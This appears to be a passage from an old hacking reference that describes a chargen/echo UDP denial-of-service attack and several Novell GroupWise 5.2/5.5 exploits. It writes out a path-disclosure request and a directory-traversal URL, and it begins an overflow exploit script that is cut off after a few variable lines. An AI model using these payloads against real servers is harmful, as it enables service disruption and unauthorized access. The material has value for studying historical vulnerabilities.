**Hacker's Strategy:** Port 19 and its corresponding service daemon, chargen, seem harmless enough. The fundamental operation of this service can be easily deduced from its name, a contraction of *character stream generator*. Unfortunately, this service is vulnerable to a telnet connection that can generate a string of characters with the output redirected to a telnet connection to, for example, port 53 (DNS). In this example, the flood of characters causes an access violation fault in the DNS service, which is then terminated, resulting in disruption of name resolution services.

Using *armudp.c* by hacker guru Army involves sending a UDP packet to the chargen port on a host with the packet's source port set to echo, and the source address set to either localhost or broadcast. UDP packets with a source address set to an external host are unlikely to be filtered and would be a communal choice for hackers.

# Exploit Discovery

**Synopsis:** Novell Web Server can be exploited to reveal the full Web path on the server, during a discovery phase, to focus Web-based attacks.

**Hack State:** Discovery.

**Vulnerabilities:** GroupWise 5.2 and 5.5.

**Breach:** The help argument in module GWWEB.EXE reveals the full Web path on the server:

```
http://server/cgi-bin/GW5/GWWEB.EXE?HELP=bad-request
```

A common reply would be

```
File not found: SYS:WEB\CGI-BIN\GW5\US\HTML3\HELP\BAD-REQUEST.HTM
```

Referring to the path returned in this example, an attacker can obtain the main Web site interface by sending the following:

```
http://server/cgi-bin/GW5/GWWEB.EXE?HELP=../ ../ ../index
```

# Remote Overflow

**Synopsis:** A remote hacker could cause a DoS buffer overflow via the Web-based access service by sending a large GET request to the remote administration port.

**Hack State:** Unauthorized access and code execution.

**Vulnerabilities:** GroupWise 5.2 and 5.5.

**Breach:** There is a potential buffer overflow vulnerability via remote HTTP (commonly, port 8008) administration protocol for Netware servers. The following is a listing of this exploit code:

```
**nwtp.c**

```sh
#!/bin/sh

SERVER=127.0.0.1
PORT=8008
WAIT=3
```
```